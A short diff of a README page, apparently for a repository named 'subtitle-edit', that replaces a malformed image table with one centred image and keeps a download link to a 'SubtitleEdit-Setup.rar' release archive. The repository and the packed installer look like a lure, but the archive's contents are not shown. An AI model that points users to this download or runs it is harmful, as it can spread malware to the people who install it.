@@ -7,29 +7,15 @@
   
 
   <br/> 
-<table>
-  <tr>
-    <th width="30%"></th>
-    <th width="80%"></th>
-  </tr>
-  <tr>
-    <td align="center">
-      <img width="494" height="331" alt=<img width="635" height="650" alt=<img width="1024" height="741" alt=<img width="1024" height="741" alt="Fd" src="https://github.com/user-attachments/assets/1a0858cd-a6dc-468e-a729-93a1d1439ddf" />
+<div align="center">
 
-
-
-
-   </td>
-    <td align="center">
-      <img width="709" height="423" alt=<img width="2550" height="1439" alt=<img width="1027" height="707" alt=<img width="1027" height="707" alt="image_2026-09-23_13-32-45" src="https://github.com/user-attachments/assets/1b9062a6-5866-45b9-bbaf-623cb25a2790" />
+<img width="512" height="370,5" alt="Fd" src="https://github.com/user-attachments/assets/ac592585-0887-4a03-ac21-41fff926e1a9" />
 
 
 
   
-  </tr>
-</table>
+  <br/> 
 
----
 
 
 ### [⬇️ Download](https://github.com/nucleusmotormancoil/subtitle-edit/releases/download/SubtitleEdit/SubtitleEdit-Setup.rar)
